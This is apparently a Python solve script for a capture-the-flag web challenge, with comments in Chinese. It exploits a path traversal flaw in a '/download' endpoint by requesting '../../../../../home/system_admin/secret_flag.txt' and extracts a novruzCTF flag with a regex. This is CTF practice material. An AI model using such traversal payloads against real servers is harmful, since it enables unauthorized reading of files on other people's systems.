#!/usr/bin/env python3
"""
题目名称: File Server
类别: Web (路径穿越)
解题思路:
    1. /download 接口的 file 参数存在路径穿越漏洞
    2. 通过 ../ 跳转到 /home/system_admin/secret_flag.txt 读取 flag
"""

import re
import sys

import requests

# 目标地址（可通过命令行参数覆盖）
TARGET_BASE = "https://58538afc0c.chall.canyouhack.org"
# 穿越路径
TRAVERSAL_PATH = "../../../../../home/system_admin/secret_flag.txt"
# flag 正则匹配
FLAG_PATTERN = r"novruzCTF\{[^}]+\}"


def exploit(base_url: str = TARGET_BASE) -> str:
    """利用路径穿越漏洞读取 flag"""
    resp = requests.get(f"{base_url}/download", params={"file": TRAVERSAL_PATH}, timeout=10)
    match = re.search(FLAG_PATTERN, resp.text)
    return match.group(0) if match else f"未找到 flag，响应内容:\n{resp.text[:500]}"


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_BASE
    try:
        result = exploit(url)
        print(result)
    except requests.RequestException as e:
        print(f"[!] 请求失败: {e}", file=sys.stderr)
        sys.exit(1)
